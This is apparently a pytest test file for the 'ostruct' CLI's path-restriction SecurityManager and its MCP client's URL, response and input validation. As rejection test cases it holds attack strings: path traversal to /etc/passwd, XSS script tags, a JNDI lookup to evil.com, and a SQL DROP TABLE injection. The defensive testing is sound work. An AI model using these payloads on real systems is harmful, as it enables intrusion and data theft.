"""Tests for security functionality."""

import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest
from pyfakefs.fake_filesystem import FakeFilesystem

from ostruct.cli.mcp_integration import MCPClient, MCPServerManager
from ostruct.cli.security import (
    DirectoryNotFoundError,
    PathSecurityError,
    SecurityErrorReasons,
    SecurityManager,
)


def test_security_manager_init(fs: FakeFilesystem) -> None:
    """Test SecurityManager initialization."""
    # Create test directories
    base_dir = Path("/test_workspace/base")
    allowed_dir = Path("/test_workspace/allowed")
    fs.create_dir(base_dir)
    fs.create_dir(allowed_dir)

    manager = SecurityManager(str(base_dir), [str(allowed_dir)])
    assert str(manager.base_dir) == str(base_dir.resolve())
    assert any(
        str(d) == str(allowed_dir.resolve()) for d in manager.allowed_dirs
    )


def test_security_manager_init_nonexistent_base(fs: FakeFilesystem) -> None:
    """Test SecurityManager initialization with nonexistent base directory."""
    with pytest.raises(DirectoryNotFoundError):
        SecurityManager("/nonexistent/base")


def test_security_manager_init_nonexistent_allowed(fs: FakeFilesystem) -> None:
    """Test SecurityManager initialization with nonexistent allowed directory."""
    base_dir = Path("/test_workspace/base")
    fs.create_dir(base_dir)

    with pytest.raises(DirectoryNotFoundError):
        SecurityManager(str(base_dir), ["/nonexistent/allowed"])


def test_security_manager_validate_path(fs: FakeFilesystem) -> None:
    """Test path validation."""
    # Create test directories and files
    base_dir = Path("/test_workspace/base")
    allowed_dir = Path("/test_workspace/allowed")
    fs.create_dir(base_dir)
    fs.create_dir(allowed_dir)
    fs.create_file(base_dir / "test.txt")
    fs.create_file(allowed_dir / "test.txt")

    manager = SecurityManager(str(base_dir), [str(allowed_dir)])

    # Test valid paths
    assert manager.validate_path(base_dir / "test.txt")
    assert manager.validate_path(allowed_dir / "test.txt")

    # Test invalid paths
    with pytest.raises(PathSecurityError) as exc_info:
        manager.validate_path("/etc/passwd")
    assert (
        exc_info.value.context["reason"]
        == SecurityErrorReasons.PATH_OUTSIDE_ALLOWED
    )


def test_security_manager_temp_paths(fs: FakeFilesystem) -> None:
    """Test temporary path handling."""
    base_dir = Path("/test_workspace/base")
    fs.create_dir(base_dir)

    # Create a test file in temp directory
    temp_file = Path(tempfile.gettempdir()) / "test.txt"
    fs.create_file(temp_file)

    # Test with temp paths allowed
    manager = SecurityManager(str(base_dir), allow_temp_paths=True)
    assert manager.validate_path(temp_file)

    # Test with temp paths disallowed
    manager = SecurityManager(str(base_dir), allow_temp_paths=False)
    with pytest.raises(PathSecurityError) as exc_info:
        manager.validate_path(temp_file)
    assert (
        exc_info.value.context["reason"]
        == SecurityErrorReasons.PATH_OUTSIDE_ALLOWED
    )


class TestMCPSecurity:
    """Test MCP integration security validation."""

    def test_mcp_url_validation(self) -> None:
        """Test MCP server URL validation."""
        valid_urls = [
            "https://mcp.deepwiki.com/sse",
            "https://example.com/mcp",
            "http://localhost:8080/mcp",
        ]

        invalid_urls = [
            "ftp://example.com/mcp",
            "file:///etc/passwd",
            "javascript:alert('xss')",
            "data:text/plain,malicious",
            "",
            "not-a-url",
        ]

        for url in valid_urls:
            # Should not raise for valid URLs
            manager = MCPServerManager([{"name": "test", "url": url}])
            assert manager.servers[0]["url"] == url

        for url in invalid_urls:
            # Should raise for invalid URLs
            with pytest.raises(ValueError):
                MCPServerManager([{"name": "test", "url": url}])

    @patch("ostruct.cli.mcp_integration.requests")
    def test_mcp_request_sanitization(self, mock_requests: Mock) -> None:
        """Test MCP request parameter sanitization."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"result": "success"}
        mock_requests.post.return_value = mock_response

        client = MCPClient("https://mcp.deepwiki.com/sse")

        # Test normal request
        result = client.send_request("test query", context="safe context")
        assert result["result"] == "success"

        # Verify request was made with sanitized parameters
        mock_requests.post.assert_called_once()
        call_args = mock_requests.post.call_args
        request_data = call_args[1]["json"]

        # Verify security headers and sanitization
        assert "query" in request_data
        assert "context" in request_data
        assert request_data["query"] == "test query"
        assert request_data["context"] == "safe context"

    def test_mcp_response_validation(self) -> None:
        """Test MCP response validation and sanitization."""
        client = MCPClient("https://mcp.deepwiki.com/sse")

        # Test valid response
        valid_response = {
            "result": "safe response",
            "metadata": {"source": "deepwiki"},
        }
        sanitized = client._sanitize_response(valid_response)
        assert sanitized == valid_response

        # Test response with potentially dangerous content
        dangerous_response = {
            "result": "<script>alert('xss')</script>",
            "metadata": {"source": "javascript:alert('bad')"},
        }
        sanitized = client._sanitize_response(dangerous_response)

        # Verify HTML/script tags are escaped or removed
        assert "<script>" not in sanitized["result"]
        assert "javascript:" not in sanitized["metadata"]["source"]

    def test_mcp_connection_security(self) -> None:
        """Test MCP connection security settings."""
        client = MCPClient("https://mcp.deepwiki.com/sse")

        # Verify HTTPS enforcement
        assert client.server_url.startswith("https://")

        # Verify timeout settings
        assert client.timeout > 0
        assert client.timeout <= 30  # Reasonable timeout

        # Verify rate limiting
        assert hasattr(client, "_rate_limiter")
        assert client._rate_limiter is not None

    @patch("ostruct.cli.mcp_integration.requests")
    def test_mcp_error_handling(self, mock_requests: Mock) -> None:
        """Test MCP error handling and security."""
        client = MCPClient("https://mcp.deepwiki.com/sse")

        # Test connection timeout
        mock_requests.post.side_effect = Exception("Connection timeout")

        with pytest.raises(Exception) as exc_info:
            client.send_request("test query")

        # Verify error doesn't expose sensitive information
        error_message = str(exc_info.value)
        assert "password" not in error_message.lower()
        assert "token" not in error_message.lower()
        assert "key" not in error_message.lower()

    def test_mcp_input_validation(self) -> None:
        """Test MCP input parameter validation."""
        client = MCPClient("https://mcp.deepwiki.com/sse")

        # Test query length limits
        long_query = "x" * 10000  # Very long query
        with pytest.raises(ValueError, match="Query too long"):
            client.send_request(long_query)

        # Test context size limits
        large_context = "x" * 50000  # Very large context
        with pytest.raises(ValueError, match="Context too large"):
            client.send_request("test", context=large_context)

        # Test malicious input patterns
        malicious_inputs = [
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/}",
            "'; DROP TABLE users; --",
        ]

        for malicious_input in malicious_inputs:
            # Should sanitize or reject malicious inputs
            with pytest.raises(ValueError):
                client.send_request(malicious_input)
